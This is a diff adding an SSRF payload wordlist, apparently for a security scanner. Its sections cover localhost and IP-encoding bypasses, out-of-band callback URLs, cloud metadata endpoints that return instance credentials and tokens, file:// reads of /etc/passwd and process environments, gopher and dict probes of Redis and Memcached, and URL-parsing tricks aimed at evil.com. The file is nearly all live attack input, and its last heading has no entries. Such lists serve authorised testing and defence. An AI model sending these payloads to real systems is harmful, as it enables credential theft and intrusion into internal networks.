@@ -1,0 +1,147 @@
+##SSRF - Error-Based##
+
+http://[invalid
+http://
+http:///
+file://
+gopher://
+http://127.0.0.1:1
+http://127.0.0.1:0
+http://localhost:99999
+http://[::]:1
+ftp://127.0.0.1:1
+http://127.0.0.1:22
+http://0.0.0.0:1
+dict://127.0.0.1:11211/INFO
+ldap://127.0.0.1:389
+
+##SSRF - Math-Based##
+
+http://127.0.0.1:1337
+http://localhost:1337
+http://127.0.0.1:7331
+http://0.0.0.0:1337
+http://[::1]:1337
+http://2130706433:1337
+http://0x7f000001:1337
+
+##SSRF - Timing-Based##
+
+http://10.255.255.1/
+http://192.0.2.1/
+http://198.51.100.1/
+http://203.0.113.1/
+https://10.255.255.1/
+http://10.255.255.1:8080/
+http://10.255.255.1:443/
+http://192.0.2.1:8443/
+http://[fd00::1]/
+http://192.168.255.255/
+http://172.31.255.255/
+ftp://10.255.255.1/
+gopher://192.0.2.1:70/
+http://10.255.255.1:9999/timeout
+
+##SSRF - OOB##
+
+https://{domain}/ssrf
+http://{domain}:8080/ssrf
+http://{domain}:443/ssrf
+//{domain}/ssrf
+\\{domain}\ssrf
+http://{domain}%23@127.0.0.1
+http://foo.{domain}/ssrf
+gopher://{domain}:70/_test
+ftp://{domain}/ssrf
+dict://{domain}:11211/INFO
+ldap://{domain}:389/
+
+##SSRF - Cloud Metadata##
+
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/api/token
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/opc/v2/instance/
+http://169.254.169.254/opc/v2/instance/metadata/
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+http://169.254.169.254/v1/
+http://169.254.169.254/v1/metadata
+
+##SSRF - IP Bypass##
+
+http://2130706433/
+http://0x7f000001/
+http://0177.0.0.1/
+http://0x7f.0x0.0x0.0x1/
+http://017700000001/
+http://0177.0000.0000.0001/
+http://127.1/
+http://127.0.1/
+http://0/
+http://0.0.0.0/
+http://[::1]/
+http://[::ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[::1]:80/
+http://[::ffff:7f00:1]/
+http://127.0.0.1.nip.io/
+http://spoofed.burpcollaborator.net/
+http://localtest.me/
+http://127.127.127.127/
+http://0x7f000001.nip.io/
+
+##SSRF - Protocol Schemes##
+
+file:///etc/passwd
+file:///etc/hosts
+file:///c:/windows/win.ini
+file:///c:/boot.ini
+file:///proc/self/environ
+file:///proc/self/cmdline
+gopher://127.0.0.1:25/_HELO%20localhost
+gopher://127.0.0.1:6379/_INFO%0d%0a
+gopher://127.0.0.1:11211/_stats%0d%0a
+dict://127.0.0.1:6379/INFO
+dict://127.0.0.1:11211/stats
+ftp://127.0.0.1/
+jar:http://127.0.0.1/!/
+netdoc:///etc/passwd
+ldap://127.0.0.1:389/%0astats%0aquit
+
+##SSRF - URL Tricks##
+
+http://evil@127.0.0.1/
+http://127.0.0.1#@evil.com
+http://evil.com@127.0.0.1/
+http://127.0.0.1?@evil.com/
+http://evil.com%0d%0a%0d%0aGET%20/internal
+http://127.0.0.1/..;/..;/admin
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.0.0.1\t@evil.com/
+
+##SSRF - DNS Rebinding##
+http://1337.oob.{domain}/
+##SSRF - Open Redirect Chain##
+http://localhost/redirect?url=http://{domain}/ssrf
+##SSRF - Internal Service Probe (Redis)##
+gopher://127.0.0.1:6379/_INFO%0d%0a
+##SSRF - Internal Service Probe (Elasticsearch)##
+http://127.0.0.1:9200/_cluster/health
+##SSRF - IPv6 Zone ID Bypass##
+http://[::1%25eth0]/
+##SSRF - URL Parsing Bug (backslash)##
